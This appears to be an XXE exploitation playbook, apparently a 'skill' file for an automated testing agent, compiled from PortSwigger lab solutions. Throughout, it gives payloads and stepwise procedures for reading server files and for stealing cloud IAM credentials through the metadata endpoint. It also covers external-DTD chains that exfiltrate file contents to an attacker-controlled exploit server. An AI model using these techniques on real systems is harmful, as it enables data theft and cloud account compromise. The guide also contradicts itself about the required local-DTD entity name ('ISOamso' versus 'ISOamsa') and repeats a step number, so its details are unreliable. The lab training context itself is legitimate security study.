# XXE Skill

> Provenance: migrated from `methodology/xxe.md`. Content preserved verbatim; original file kept as source of truth.

## Core Concept

XML External Entity injection occurs when the XML parser processes attacker-supplied DOCTYPE declarations with external entities enabled: `<!ENTITY xxe SYSTEM "file:///etc/passwd">` referenced as `&xxe;` is substituted server-side, and the result flows into reflected output (or errors). Data (XML markup) becomes parser directives → filesystem/network reads.

First shape validated: `POST /product/stock` (`application/xml`, `<stockCheck><productId>`) → entity in reflected-error slot (`Invalid product ID: <contents>`) → full file in 400 body → `is-solved` on retrieval demonstration.
Second shape validated (XXE→SSRF composition): same endpoint/slot with `http://169.254.169.254/` entity → metadata listing in error → rung-by-rung drill (`latest/` → `meta-data/` → `iam/` → `security-credentials/` → role → JSON) → IAM credentials in error → `is-solved`. Entity syntax from XXE, target selection from SSRF discipline.
Third shape validated (blind OOB): same endpoint, `file://` entity → generic `Invalid product ID` (parsed but unreflected = blind, not hardened) → `http://<unique>.burpcollaborator.net` entity → `XML parsing error` on trigger (non-oracle – fetch fires regardless) → 65s wait → `is-solved` by attribution. Trigger status never decides OOB labs.
Fourth shape validated (blind OOB via parameter entities): same endpoint blocks general-entity references (`400 Entities are not allowed`) → external parameter entity in DOCTYPE (`<!ENTITY % xxe SYSTEM "http://<unique>/">` + `%xxe;`, clean body) → `XML parsing error` → 70s wait → `is-solved`. Reference syntax `%xxe;` has NO space (`% xxe;` is malformed, never fetches – silent waits prove nothing); fresh subdomain per attempt (including retries).
Fifth shape validated (SVG avatar upload, Batik): comment avatar upload accepts SVG → rasterizer resolves `file://` entities baking text into served PNG pixels → white-fill control (326px) vs entity render (765px) proves resolution quantitatively → enlarge + visual read → bracket-delimiter re-render proves completeness → form-encoded `Submit solution` (`{"correct":true}`) → `is-solved`. No OCR needed for short secrets.
Sixth shape validated (XInclude, no DOCTYPE): form-encoded stock endpoint (`URLSearchParams`, NOT XML – read `stockCheckPayload.js` first) builds XML server-side with XInclude enabled → `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>` as the reflected-slot VALUE (URL-encoded) → file in `Invalid product ID` error → `is-solved`. No DTD needed – the bypass for DOCTYPE-focused defenses.
Seventh shape validated (blind error-based exfiltration via external DTD): same endpoint blocks general-entity references (`Entities are not allowed`) → host external DTD on exploit server via direct STORE POST (read form contract; verify served bytes) with `%file` (target read) + `%eval` (redefine `exfil` → `file:///nonexistent/%file;`, `&#x25;`-escaped) + `%exfil;` → reference with clean body → `FileNotFoundException` path embeds file content → `is-solved`. Detection needs bare-URL DTD; exfiltration needs the file/eval/exfil trio.
Eighth shape validated (blind OOB exfiltration to log via external DTD): same block → DTD with `%file;` + `%eval;` + `%exfil;` to `http://exploit-server/exfil?x=%file;` → backend fetches DTD (log shows Java UA) then requests exfil URL with content → read value from `GET /log` access log → submit via answer oracle (`{"correct":true}`) → `is-solved`. Prove channel with KNOWN file (`/etc/hostname`) before secret guesses; DTD-fetch-without-exfil = wrong PATH, not broken channel.
Ninth shape validated (local DTD repurposing, no network): NO exploit server → include `file:///usr/share/yelp/dtd/docbookx.dtd` parses (include-alone probe) → redefine its `%ISOamso;` entity (EXACT name – `ISOamsa` silently kills the chain) carrying the ENTIRE nested file/eval/error chain with `&#x25;`/`&#x27;` escapes → expansion in external context → `FileNotFoundException` embeds content → `is-solved`. Machine-measure ALL `Content-Length`s (hand counts poison debugging with phantom name/space rules); `<!DOCTYPE message` + newlines per documented shape.

## Security Boundary

Intended: XML body = data values for lookup.
Violated when: `XML with DOCTYPE → entity resolved → file/network content in response/error` with no DTD allowlist or entity disabling.

## Recognition Patterns

- Stock-check / document-upload / SAML / API endpoints consuming `application/xml` (client JS builders like `xmlStockCheckPayload.js` reveal exact shape).
- Form-encoded stock endpoints whose backend builds XML server-side (`stockCheckPayload.js` with `URLSearchParams` – XInclude-in-value shape, NOT DOCTYPE bodies).
- Comment avatar uploads accepting SVG (rasterized to PNG + served back – Batik-style entity-to-pixels channel; verify served `Content-Type`/dimensions, not just upload 302).
- Labs shipping an exploit server with Craft-a-response file STORE (external-DTD host for error-exfiltration; direct POST works, browser optional).
- Labs shipping exploit server + access log (`GET /log`) + answer oracle (`POST /submitSolution`, form-encoded `answer`, `{"correct":true}`) – OOB-exfil + submit pattern.
- Labs with NO exploit server but GNOME-stack local DTDs (`/usr/share/yelp/dtd/docbookx.dtd` + `%ISOamso;` reference) – repurposing pattern, zero egress.
- Numeric-looking responses (`551`, `600`) for valid shapes vs verbose `400` errors (`Invalid product ID: ...`, `FileNotFoundException`, parser traces) for entity probes.
- `FileNotFoundException: <path>` = resolution works, path wrong (proceed to other paths). Parser rejection / silent empty = hardening (pivot to OOB/parameter entities).
- Blindness spectrum: generic `Invalid product ID` with parsed-but-unreflected entity = blind yet OOB-capable (proceed to Collaborator entity); parse rejection = blocked.
- Block message `Entities are not allowed` = general-entity references blocked → switch to DTD-layer parameter entities (body stays clean); it specifies the bypass.
- Minimal one-word listings (`latest`, `iam`, `security-credentials`, role name) = cloud metadata drill rungs – consume literally, do not brute-force paths.

## Common Locations

- `/product/stock`-style XML APIs (`<stockCheck>`, `<productId>`, `<storeId>`).
- Any endpoint accepting `Content-Type: application/xml` with reflected values or errors.

## Indicators

- `<!ENTITY xxe SYSTEM "file:///etc/passwd">` + `&xxe;` in reflected slot → file bytes in error/body (even on 400).
- `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>` as a form VALUE (URL-encoded) → file bytes in error – no DOCTYPE needed.
- External-DTD trio for error exfil (hosted): `%file` reads target; `%eval` defines `<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>`; `%eval;` + `%exfil;` trigger → content embedded in `FileNotFoundException` path.
- External-DTD trio for OOB exfil (hosted): `%file` reads target; `%eval` defines `<!ENTITY &#x25; exfil SYSTEM 'http://exploit-server/exfil?x=%file;'>`; `%eval;` + `%exfil;` trigger → content lands in access log (`GET /exfil?x=<value>`, backend Java UA); read via `GET /log`, submit value.
- Passwd content (users/UIDs/homes/shells) as recon for next paths.

## Testing Methodology

1. Baseline: valid XML per client-side builder (`productId=1,storeId=1` → `551`); record status + oracle shape (count vs error text).
2. Read builders (`*Payload.js`) for exact element names AND request shape – XML body (`xmlStockCheckPayload.js`) vs form-encoded (`stockCheckPayload.js` with `URLSearchParams`): shape mismatch wastes the first probe; form shapes take in-value XInclude, never DOCTYPE bodies.
3. Prove with universal path first: `file:///etc/passwd` in the reflected-error slot (`productId`), keep `storeId` constant.
4. Read the error CLASS: file bytes (vulnerable + exfil) vs `FileNotFoundException` (resolution works, try other paths: `/home/carlos/...`, `/proc/self/environ`, app sources) vs parser rejection (pivot techniques).
5. For SSRF objectives: swap scheme to `http://169.254.169.254/` (same slot/syntax – one variable), then drill metadata rung-by-rung consuming each listing (`latest/meta-data/iam/security-credentials/<role>`); record key material as evidence.
6. For blind/OOB objectives: `http://<unique-12char>.burpcollaborator.net` entity (fresh subdomain per attempt) → expect `XML parsing error` or generic status (NON-oracle – fetch fires regardless) → wait 60-90s → marker check. Never conclude from trigger response; never reuse subdomains across attempts.
7. For parameter-entity objectives (general references blocked): `<!ENTITY % xxe SYSTEM "http://<unique>/">` + `%xxe;` INSIDE the DOCTYPE, body clean (`productId=1`); reference has NO space after `%`; fresh subdomain even on syntax-fix retries (prior silence is inconclusive, not proof of no-fire).
8. For error-exfiltration objectives (blind + blocked body refs): STORE external DTD on exploit server via direct POST (read Craft-form contract: `urlIsHttps/responseFile/responseHead/responseBody/formAction`; verify served bytes identical) with file/eval/exfil trio → reference it with clean body → read content from `FileNotFoundException` path. Detection DTDs (bare URL) vs exfil DTDs (trio) – pick by objective.
9. For OOB-exfiltration objectives (blind + submit oracle): same STORE mechanics with exfil URL `http://exploit-server/exfil?x=%file;` → trigger → poll `GET /log` for `GET /exfil?x=<value>` (backend UA distinguishes server hits from yours) → submit value per answer contract. Prove channel FIRST with known file (`/etc/hostname`); DTD-fetch-without-exfil-follow means wrong PATH – change the file, not the technique.
10. For local-DTD repurposing (no exploit server): include-alone probe (`% local_dtd`-style decl+ref, exact length) proves existence+parsing → redefine the DOCUMENTED entity name EXACTLY (`ISOamso`, from hint/solution – lookalikes silently disengage) with the whole nested chain inside its value (`&#x25;`/`&#x27;` escapes throughout) → trigger → content error → marker. Machine-measure lengths; `<!DOCTYPE message` + newlines per documented shape.
10. For SVG-upload objectives (avatar rasterized + served): white-text control SVG first (pixel-count baseline) → entity SVG with `fill="white"` → white-pixel differential proves resolution → enlarge (NEAREST) + visual read (no OCR needed for short secrets) → delimiter-wrap (`[&xxe;]`) re-render on narrower canvas proves completeness → submit per `submitSolution.js` contract (method/path/param/encoding – read it, form-encoded `answer` here).
11. Recompute `Content-Length` per raw body; keep `Content-Type: application/xml`.
12. One variable per request (only DOCTYPE/entity/reference changes).

## Verification

- Baseline-vs-entity differential (count vs file bytes) on same endpoint/session.
- Negative control: nonexistent path must yield `FileNotFoundException`-style (not parser) error to prove general `file://` resolution.
- OOB: unique subdomain per attempt (attribution hygiene) + 60-90s async wait + global marker; trigger error text (`XML parsing error` vs generic) is explicitly NON-oracle.
- Impact via global marker (`is-solved`) or demonstrated sensitive content – fresh request, not trigger session state.

## Common Failure Modes

- Attacking non-reflected slots (entity resolves but output never surfaces – use error slots or OOB).
- Guessing instance paths before universal proof (`/etc/passwd` first, always).
- Guessing metadata paths instead of consuming listings (each rung names the next – brute force wastes requests).
- Stale `Content-Length` on raw HTTP (truncation → misleading 400s); recompute per body.
- Treating 400 as failure – in XXE, errors CARRY the file.
- Concluding OOB failure from trigger response (`XML parsing error` coincides with successful fetch – parse fails during/after fetch); marker after wait arbitrates.
- Reusing Collaborator subdomains across attempts/labs – attribution ambiguity; fresh 12-char per attempt.
- Writing `% xxe;` with a space (malformed reference, never fetches – silent waits prove nothing); correct is `%xxe;`. Validate DTD-reference grammar BEFORE long waits.
- Firing blind payloads against unverified hosted files (silent STORE corruption mimics hardening – GET the DTD back and diff before triggering).
- Assuming the secret path (`/home/carlos/secret` guess went silent while channel worked) – prove OOB-exfil channel with `/etc/hostname` first, then pivot paths; DTD-fetch-without-exfil = path failure.
- Hand-counting `Content-Length` (poisons debugging with phantom name/space/syntax rules – every mismatch looks like a parser quirk); machine-measure every body.
- Theorizing parser rules from confounded payloads (wrong name + wrong lengths + superstition) – reset to a documented shape + single-variable retest instead.
- Sending DOCTYPE bodies to form-encoded endpoints (shape mismatch – read the builder; form shapes need in-value XInclude).
- Reading all-black entity renders as parser failure – check `fill` first (black-on-black invisibility); white-text control isolates rendering from parsing.
- Reading all-black entity renders as parser failure – check `fill` first (black-on-black invisibility); white-text control isolates rendering from parsing.
- Submitting secrets as JSON when the JS contract says form-encoded (`submitSolution.js`: method/path/param) – read the contract; 404 vs `{"correct":true}` is the tell.

## Impact Considerations

- Unauthenticated arbitrary file read (demonstrated full passwd: users, UIDs, homes, shells).
- Pixel-exfiltrated secrets (SVG avatar rasterization bakes entity text into served PNG; visual read + submit oracle).
- Cloud IAM credential theft (XXE→SSRF to metadata: AccessKeyId + SecretAccessKey + Token in error text) – full cloud identity compromise.
- Blind OOB exfiltration to attacker log (file content embedded in exfil URL path; read via access log, submit value) – arbitrary file read with zero reflection channel.
- Local-DTD error exfiltration (no network at all – repurposed GNOME DTD + exact-name redefinition + nested escapes).
- Blind OOB interaction (detection labs solved by attribution; same primitive enables OOB exfiltration and internal probing).
- Real-world extension: source/config/key theft, SSRF via `http://` entities, OOB exfiltration where reflection absent, DoS via billion-laughs where entities expand.

## Lessons Learned

- From PortSwigger “Exploiting XXE using external entities to retrieve files”: builder-read shape → `file:///etc/passwd` entity in `productId` → `400 Invalid product ID: root:x:0...` (full file) → `/` `is-solved`. `secret`-path negative (`FileNotFoundException`) proved generality. 5 requests, anon.
- From PortSwigger “Exploiting XXE to perform SSRF attacks”: same endpoint/slot, scheme swapped to `http://169.254.169.254/` → `latest` → `iam` → `security-credentials` → `admin` → credentials JSON in errors → `/` `is-solved`. 7 requests. Entity syntax (xxe.md) + metadata targets (ssrf.md) composed; listings consumed, never guessed.
- From PortSwigger “Blind XXE with out-of-band interaction”: `file://` entity → generic `Invalid product ID` (blind-but-parsed, not hardened) → `http://<unique-12char>.burpcollaborator.net` entity → `XML parsing error` on trigger (non-oracle) → 65s wait → `/` `is-solved`. Third vindication of cross-class blind-OOB discipline (SSRF-blind, OS-command-blind-OOB, XXE-blind-OOB).
- From PortSwigger “Blind XXE with OOB via parameter entities”: general entities blocked (`Entities are not allowed`) → parameter entity with spaced `% xxe;` inconclusive after 125s → corrected `%xxe;` (fresh subdomain, clean body) → `XML parsing error` → 70s wait → `is-solved`. Spacing is load-bearing; inconclusive waits demand varied retries, not abandonment.
- From PortSwigger “Exploiting XXE via image file upload”: SVG avatar with `file:///etc/hostname` entity → Batik PNG (white-fill control 326px vs entity 765px proves resolution) → enlarged visual read → bracketed re-render `[491591fda234]` proves completeness → form-encoded submit → `{"correct":true}` → `is-solved`. Pixels as exfil channel; JS contract before submitting.
- From PortSwigger “Exploiting XInclude to retrieve files”: `stockCheckPayload.js` read FIRST (form-encoded, not XML) → in-value `<foo xmlns:xi=...><xi:include parse="text" href="file:///etc/passwd"/></foo>` → `400 Invalid product ID: root:x:0...` (full file) → `/` `is-solved`. 4 requests. Builder-shape match beats DOCTYPE habit.
- From PortSwigger “Exploiting blind XXE to retrieve data via error messages”: `Entities are not allowed` (body refs dead) → STORE external DTD (`%file`/`%eval`/`%exfil` trio, verified served) → clean-body reference → `FileNotFoundException: /nonexistent/root:x:0...` (full file) → `/` `is-solved`. Error path as exfil channel; exploit-server forms are POSTable directly, no browser needed.
- From PortSwigger “Exploiting blind XXE to exfiltrate data using a malicious external DTD”: same block → exfil-DTD (`/exfil?x=%file;`) STORE-verified → trigger → backend DTD fetch logged (Java UA) but NO exfil follow-up for `/home/carlos/secret` (wrong path, not broken channel) → re-STORE with `/etc/hostname` → log shows `GET /exfil?x=420062c1dd54` → submit → `{"correct":true}` → `is-solved`. Known-file channel proof before secret guesses; access log (`GET /log`) as primary oracle.
- From PortSwigger “Exploiting XXE to retrieve data by repurposing a local DTD”: NO exploit server → include-alone `docbookx.dtd` parses → `ISOamsa` (not `ISOamso`) redefinition with fully-nested `&#x25;`/`&#x27;`-escaped chain + `<!DOCTYPE message` + newlines (exact length 416) → `FileNotFoundException: /nonexistent/root:x:0...` → `is-solved`. Exactness on three axes (name/escapes/lengths); phantom-rule debugging cured by documented-shape reset.

## Related Concepts

- File handling (methodology/traversal.md, file-security.md – path thinking for WHAT to read once XXE proven).
- SSRF methodology (methodology/ssrf.md – `http://` entities / OOB exfil patterns when reflection absent; metadata drill targets for XXE→SSRF composition).
- methodology/verification.md (differential + negative-control + marker proof).

## Sources

- PortSwigger lab: Exploiting XXE using external entities to retrieve files (knowledge/portswigger/labs/xxe-external-entity-file-retrieval.md)
- PortSwigger lab: Exploiting XXE to perform SSRF attacks (knowledge/portswigger/labs/xxe-ssrf-metadata-credentials.md)
- PortSwigger lab: Blind XXE with out-of-band interaction (knowledge/portswigger/labs/xxe-blind-oob-interaction.md)
- PortSwigger lab: Blind XXE with OOB via parameter entities (knowledge/portswigger/labs/xxe-blind-oob-parameter-entities.md)
- PortSwigger lab: Exploiting XXE via image file upload (knowledge/portswigger/labs/xxe-svg-avatar-file-upload.md)
- PortSwigger lab: Exploiting XInclude to retrieve files (knowledge/portswigger/labs/xxe-xinclude-file-retrieval.md)
- PortSwigger lab: Exploiting blind XXE to retrieve data via error messages (knowledge/portswigger/labs/xxe-blind-error-based-exfiltration.md)
- PortSwigger lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD (knowledge/portswigger/labs/xxe-blind-oob-exfiltration-dtd.md)
- PortSwigger lab: Exploiting XXE to retrieve data by repurposing a local DTD (knowledge/portswigger/labs/xxe-local-dtd-repurposing.md)
